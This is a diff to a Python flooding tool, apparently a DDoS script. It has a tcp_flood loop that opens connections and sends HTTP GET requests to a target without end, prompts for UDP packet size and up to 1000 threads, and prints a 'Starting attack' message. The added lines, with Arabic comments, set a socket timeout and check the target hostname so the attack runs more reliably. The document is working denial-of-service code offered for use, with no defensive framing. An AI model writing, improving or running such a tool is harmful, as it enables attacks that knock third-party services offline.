@@ -2,6 +2,7 @@ import socket
 import random
 import threading
 import time
+import ssl  # أضفنا استيراد ssl
 from colorama import Fore, init
 
 init(autoreset=True)
@@ -32,6 +33,7 @@ def tcp_flood(target_ip, target_port):
     while True:
         try:
             tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            tcp_socket.settimeout(5)  # إضافة Timeout
             tcp_socket.connect((target_ip, target_port))
             tcp_socket.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode())
             tcp_socket.close()
@@ -71,6 +73,13 @@ def main():
     packet_size = int(input(f"{Fore.YELLOW}[?] UDP Packet Size (1-65500): "))
     threads_count = int(input(f"{Fore.YELLOW}[?] Threads (1-1000): "))
     use_https = input(f"{Fore.YELLOW}[?] Use HTTPS? (y/n): ").lower() == 'y'
+
+    # حل المشكلة: التحقق من صحة العنوان
+    try:
+        socket.gethostbyname(target_ip)  # التحقق من صحة الاسم أو IP
+    except socket.gaierror:
+        print(f"{Fore.RED}[!] Invalid target IP/DOMAIN.")
+        return
 
     print(f"{Fore.RED}[!] Starting attack on {target_ip}:{target_port} for {duration} seconds...")
 
